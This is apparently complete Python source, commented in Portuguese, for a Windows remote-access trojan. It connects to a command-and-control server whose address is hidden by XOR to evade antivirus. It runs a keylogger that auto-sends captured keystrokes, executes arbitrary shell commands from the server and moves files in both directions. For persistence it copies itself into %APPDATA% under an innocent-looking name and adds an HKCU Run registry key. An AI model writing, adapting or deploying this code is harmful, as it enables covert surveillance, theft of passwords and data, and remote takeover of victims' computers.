import os
import sys
import winreg
import shutil
import socket
import base64
import itertools
import subprocess

from time import sleep
from pathlib import Path
from pynput import Keyboard
from datetime import datetime

# Resolve o caminho da pasta onde o programa vive, independente de estar
# rodando como script Python puro ou como executável gerado pelo PyInstaller.
# Quando não tem script real, sys.executable aponta pro .exe congelado.
if getattr(sys, 'frozen', False):
    application_path = os.path.dirname(sys.executable)
else:
    application_path = os.path.dirname(os.path.abspath(__file__))

# -----------------------------------------------------------------------------
# Carregamento do ".env" (configuração em tempo de execução)
# -----------------------------------------------------------------------------
# Procura um arquivo .env na mesma pasta e injeta as linhas "CHAVE=valor"
# no os.environ, para que o operador possa configurar IP/porta/nomes sem
# recompilar o payload. Linhas vazias e que começam com "#" são ignoradas.
env_path = os.path.join(application_path, '.env')
if os.path.exists(env_path):
    with open(env_path, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                if '=' in line:
                    key, value = line.split('=', 1)
                    os.environ[key.strip()] = value.strip()


# -----------------------------------------------------------------------------
# xor_codec(data, key) -> aplica XOR byte a byte (encriptar E decriptar)
# -----------------------------------------------------------------------------
# XOR é a própria inversa: (x ^ k) ^ k == x. Por isso a MESMA função serve
# para encriptar e decriptar — basta usar a mesma chave nos dois lados.
# Esconde strings que são assinaturas clássicas de malware (keylogger, chave
# de registro, nome de serviço...) e que geram sinal para antivírus e EDR's.
# key[i % len(key)]: faz a chave se repetir (como itertools.cycle) quando o
# payload é maior que a chave — sem precisar importar nada extra.
def xor_codec(data, key):
    # core: XOR byte a byte (entrada e chave em bytes)
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))


def decrypt_string(cipher_hex, key):
    # hex -> bytes (fromhex) -> XOR -> texto UTF-8
    # Pode falhar com ValueError (hex inválido) ou UnicodeDecodeError (chave errada)
    return xor_codec(bytes.fromhex(cipher_hex), key.encode('utf-8')).decode('utf-8')


def env_or_secret(env_name, secret_hex, fallback=""):
    # Resolve uma config na ordem: .env > decrypt(DECRYPT_KEY) > fallback
    # Prioriza o valor do ambiente; só decripta quando a variável NÃO existe
    # E a chave está presente. Nunca quebra a importação (cai no fallback em erro).
    value = os.environ.get(env_name)
    if value:
        return value
    key = os.environ.get("DECRYPT_KEY")
    if key:
        try:
            return decrypt_string(secret_hex, key)
        except (ValueError, UnicodeDecodeError):
            return fallback
    return fallback



# -----------------------------------------------------------------------------
# Configurações (com fallback via .env)
# -----------------------------------------------------------------------------
IP = env_or_secret("JANUS_IP", "5a6a0e0d5d7e020a47", "") # Endereço do servidor C2
PORT = int(env_or_secret("JANUS_PORT", "5f6c0a", "") or 0)         # Porta do servidor C2
PROGRAM_NAME = env_or_secret("PROGRAM_NAME", "26315a5102235d4202074745103851791f264e29142b", "")  # Nome usado na cópia/registro
REGISTRY_KEY_PATH = env_or_secret("REGISTRY_KEY_PATH", "38375f571a3140412a1f5e42032347451c2064171e200f374e50311347560437595527294659133b561c253b05", "")  # Chave de autostart
MAX_BUFFER_SIZE = 500  # Quantas teclas o buffer do keylog guarda antes do auto-envio

# Estado global do keylogger:
#   keylog_buffer          -> teclas capturadas acumuladas como lista de strings
#   buffer_auto_send_pending -> "true" quando o buffer encheu e precisa esvaziar
#   keylogger_active       -> flag de "já está rodando?" (evita listener duplicado)
#   listener               -> referência ao objeto Keyboard.Listener ativo
keylog_buffer = []
buffer_auto_send_pending = False
keylogger_active = False
listener = None


def download_file(filepath):
    try:
        if not os.path.exists(filepath):
            return {
                'success': False,
                'error': "File not Found"
            }
        
        with open(filepath, 'rb') as f:
            file_data = f.read()

        return {
            'success': True,
            'filename': Path(filepath).name,
            'data': base64.urlsafe_b64encode(file_data).decode('utf-8'),
            'size': len(file_data)
        } 

    except Exception as e:
        return {
            'sucess': False,
            'error': str(e)
        }


def upload_file(filepath, file_base64):
    try:
        file_data = base64.b64decode(file_base64)
        directory = os.path.dirname(filepath)

        if directory and not os.path.exists(filepath):
            os.makedirs(directory)
        
        with open(filepath, 'wb') as f:
            f.write(file_data)

        return {
            'success': True,
            'filename': Path(filepath).name,
            'size': len(file_data)
        } 

    except Exception as e:
        return {
            'sucess': False,
            'error': str(e)
        }

# -----------------------------------------------------------------------------
# format_key(key) -> string legível da tecla pressionada
# -----------------------------------------------------------------------------
# Converte o objeto "key" do pynput em texto. Teclas normais têm o atributo
# ".char" (a letra/dígito); teclas especiais (Enter, Shift...) não têm, e aí
# caímos no AttributeError e procuramos num dicionário fixo. Se não estiver
# no dicionário, usa o próprio nome da tecla em maiúsculas.
def format_key(key):
    try:
        return key.char
    except AttributeError:
        special_keys = {
            Keyboard.Key.space: ' ',
            Keyboard.Key.enter: '[ENTER]\n',
            Keyboard.Key.tab: '[TAB]',
            Keyboard.Key.backspace: '[BACKSPACE]',
            Keyboard.Key.shift: '',
            Keyboard.Key.ctrl: '',
            Keyboard.Key.alt: '',
        }
        return special_keys.get(key, f'[{key.name.upper()}]')


# -----------------------------------------------------------------------------
# on_press(key) — callback disparado a cada tecla pelo pynput
# -----------------------------------------------------------------------------
# A única função chamada pelo listener. Converte a tecla e a adiciona ao
# buffer (respeitando o limite). Quando o buffer enche, marca a flag de
# auto-envio para que o loop em listen() a esvazie e mande pra o servidor.
def on_press(key):
    global keylog_buffer, buffer_auto_send_pending

    formatted = format_key(key)
    if formatted and len(keylog_buffer) < MAX_BUFFER_SIZE:
        keylog_buffer.append(formatted)
    
    if len(keylog_buffer) >= MAX_BUFFER_SIZE:
        buffer_auto_send_pending = True


# -----------------------------------------------------------------------------
# get_keylog_data() -> string com o conteúdo capturado (e esvazia o buffer)
# -----------------------------------------------------------------------------
# Monta o "dump" do keylog com timestamp, concatena tudo que está no buffer e
# limpa o buffer (para não reenviar a mesma coisa duas vezes). Retorna uma
# mensagem padrão se o buffer estiver vazio.
def get_keylog_data():
    global keylog_buffer

    if not keylog_buffer:
        return "[i] keylog buffer is empty"

    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data = f'[+] keylog captured at {timestamp}:\n{"".join(keylog_buffer)}'
    keylog_buffer = []

    return data


# -----------------------------------------------------------------------------
# start_keylogger() — inicia a captura de teclas
# -----------------------------------------------------------------------------
# Cria um Keyboard.Listener do pynput que chama on_press a cada tecla e o
# inicia em thread separada (a captura continua enquanto o resto roda).
# O guard "if keylogger_active" evita criar dois listeners simultâneos.
def start_keylogger():
    global keylogger_active, listener

    if keylogger_active:
        return "[i] keylogger already runnig"
    
    listener = Keyboard.Listener(on_press=on_press)
    listener.start()
    keylogger_active = True

    return "[+] keylogger started"


# -----------------------------------------------------------------------------
# stop_keylogger() — para a captura de teclas
# -----------------------------------------------------------------------------
# Só faz sentido se o listener existir; chama .stop() para encerrar a thread
# e atualiza a flag de estado.
def stop_keylogger():
    global keylogger_active, listener

    if not keylogger_active:
        return "[i] keylogger not running"

    if listener:
        listener.stop()
    
    keylogger_active = False
    return "[+] keylogger stopped"


# -----------------------------------------------------------------------------
# copy_to_system() — copia o executável atual para %APPDATA%
# -----------------------------------------------------------------------------
# Passo 1 da persistência: copia o próprio binário (sys.executable) para
# %APPDATA%\Microsoft\Windows\<PROGRAM_NAME>.exe, seguindo a técnica comum de
# se hospedar numa pasta legítima com nome "inocente". Se o arquivo já está
# lá (mesmo caminho), não recopia e retorna o caminho atual.
def copy_to_system():
    try:
        appdata_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows")
        if not os.path.exists(appdata_path):
            os.makedirs(appdata_path)
        
        current_file = sys.executable
        destination = os.path.join(appdata_path, f'{PROGRAM_NAME}.exe')

        # "mesmo arquivo?" -> evita se copiar em cima de si próprio
        if os.path.abspath(current_file) != os.path.abspath(destination):
            shutil.copy2(current_file, destination)
            return destination

        return current_file

    except Exception as e:
        print(f'Error copying file: {e}')
        return sys.executable


# -----------------------------------------------------------------------------
# add_to_registry(file_path) — cria a entrada de autostart no registro
# -----------------------------------------------------------------------------
# Passo 2 da persistência: abre a chave "Run" do HKCU em modo escrita e grava
# um valor REG_SZ apontando para o binário, fazendo o Windows executá-lo no
# login do usuário. Usa HKCU (não HKLM) porque não exige admin.
def add_to_registry(file_path):
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY_PATH,
            0,
            winreg.KEY_SET_VALUE
        )

        winreg.SetValueEx(
            key,
            PROGRAM_NAME,
            0,
            winreg.REG_SZ,
            file_path
        )

        winreg.CloseKey(key)
        return True 

    except Exception as e:
        return False


# -----------------------------------------------------------------------------
# check_persistence() — o serviço já está persistido?
# -----------------------------------------------------------------------------
# Abre a mesma chave do registro em modo LEITURA (sem escrever) e tenta ler o
# valor. Se a chave/valor não existir, o Windows sobe FileNotFoundError e
# retornamos False (precisa persitir ainda).
def check_persistence():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY_PATH,
            0,
            winreg.KEY_READ
        )
        value, _ = winreg.QueryValueEx(key, PROGRAM_NAME)
        winreg.CloseKey(key)

        return True

    except FileNotFoundError:
        return False

    except Exception as e:
        print(f'[-] Error checking persistence: {e}')
        return False


# -----------------------------------------------------------------------------
# setup_persistence() — orquestra a persistência completa
# -----------------------------------------------------------------------------
# Inicializa as configurações de persistência: se já persistido, não faz nada;
# senão copia o binário e cria a entrada no registro.
def setup_persistence():
    try:
        if check_persistence():
            return 
        
        persistence_path = copy_to_system()

        add_to_registry(persistence_path)


    except Exception as e:
        print(f"ERROR: {e}")


# -----------------------------------------------------------------------------
# connect() — cria o socket e conecta no servidor C2
# -----------------------------------------------------------------------------
# Abre um socket TCP, conecta no (IP, PORT) configurados e envia uma "handshake"
# em texto claro ao servidor. Retorna o socket pronto para trocar comandos.
def connect():
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((IP, PORT))
        c.send(b"[#] Client connected\n\n")
        return c
    except Exception as e:
        print(f'Connection error: {e}')


# -----------------------------------------------------------------------------
# listen(c) — loop principal de troca de mensagens com o servidor
# -----------------------------------------------------------------------------
# Loop infinito que:
#   1. Se o buffer do keylog encheu, envia os dados com prefixo [AUTO-SEND].
#   2. Faz recv com timeout de 0.5s — retorna enquanto espera/ouve.
#   3. Se chegar comando "/exit", encerra. Senão executa chamando cmd().
# O timeout curto garante que o keylog seja esvaziado mesmo sem comando novo.
def listen(c):
    global buffer_auto_send_pending

    try:
        while True:

            if buffer_auto_send_pending:
                data = get_keylog_data()
                c.send(f'[AUTO-SEND] {data}\n\n'.encode())
                buffer_auto_send_pending = False
            
            c.settimeout(0.5)
            
            try:
                data = c.recv(1024).decode().strip()
                if data == "/exit":
                    return
                else:
                    cmd(c, data)
            
            except socket.timeout:
                continue

    except Exception as e:
        print(f'Listen function error: {e}')


# -----------------------------------------------------------------------------
# cmd(c, data) — dispatcher de comandos recebidos
# -----------------------------------------------------------------------------
# Interpreta o comando textual vindo do servidor:
#   - "cd <path>"          : muda o diretório de trabalho do processo
#   - "/persistence ..."   : consulta ou executa a persistência
#   - "/keylog ..."        : controla o keylogger
#   - qualquer outra coisa : executa como comando de shell via subprocess e
#                            devolve a saída (stdout+stderr) ao servidor
def cmd(c, data):
    try:
        if data.startswith("cd "):
            try:
                os.chdir(data[3:].strip())
            except Exception as e:
                print(f'CD function error: {e}')            
            c.send(b"[i] Directory changed\n\n")
            return

        if data == "/persistence status":
            if check_persistence():
                c.send(f"[+] Persistence status:\n\t[i] Path: {sys.executable}\n\t[i] Registry Key: {REGISTRY_KEY_PATH}\n\t[i] Name: {PROGRAM_NAME}\n\n".encode())
                return 
            else:
                c.send(b"[-] Persistence status: Fail\n\n")
                return

        elif data == "/persistence setup":
            setup_persistence()
            c.send(b"[+] Done\n\n")
            return

        elif data == "/keylog start":
            response = start_keylogger()
            c.send(response.encode() + b"\n\n")
            return

        elif data == "/keylog stop":
            response = stop_keylogger()
            c.send(response.encode() + b"\n\n")
            return

        elif data == "/keylog dump":
            response = get_keylog_data()
            c.send(response.encode() + b"\n\n")
            return
        
        elif data == "/keylog status":
            status = "Running" if keylogger_active else "Stopped"
            buffer_size = len(keylog_buffer)

            response = f'[i] Keylogger status: {status}\n Buffer: {buffer_size} keys'

            c.send(response.encode() + b"\n\n")
            return

        elif data.startswith("/download "):
            filepath = data[10:].strip()
            c.send(b"[i] Preparing file for download... \n")

            result = download_file(filepath)

            if result['success']:
                info = (
                    f"[+] File read for download\n"
                    f"[i] Filename: {result}\n"
                    f"[i] Size {result['size']}\n"
                    f"[FILE_START]\n"
                )
                c.send(info.encode())
                c.send(result['data'].encode())
                c.send(b"\n[FILE_END]\n\n")

            else:
                c.send(f"[-] Download failed: {result['error']}\n\n".encode())

            return 

        # Fallback: comando de shell. shell=True delega pro interpretador do
        # sistema (cmd.exe), então suporta pipes/redirecionamento. Captura
        # stdout e stderr e manda a saída de volta — se vazia, avisa.
        else: 
            p = subprocess.Popen(
                data,
                shell=True,
                stdin=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdout=subprocess.PIPE
            )

            output = p.stdout.read() + p.stderr.read()

            if output:
                c.send(output + b"\n\n")
            else:
                c.send(b"[+] Command executed\n\n")

    except Exception as e: 
        print(f'CMD function error: {e}')


# -----------------------------------------------------------------------------
# __main__ — ponto de entrada do processo
# -----------------------------------------------------------------------------
# 1. Configura a persistência (cópia + registro) logo no início.
# 2. Entra num loop infinito: tenta conectar, e enquanto a conexão estiver de
#    pé fica em listen() trocando comandos. Se a conexão cair ou falhar,
#    espera 5 segundos e tenta de novo (comportamento "phoenix").
if __name__ == '__main__':
    try:

        setup_persistence()

        while True:
            client = connect()

            if client:
                listen(client)
            else :
                sleep(5)

    except KeyboardInterrupt:
        print('Program stopped by the user')

    except Exception as e:
        print(f'Error in main function: {e}')
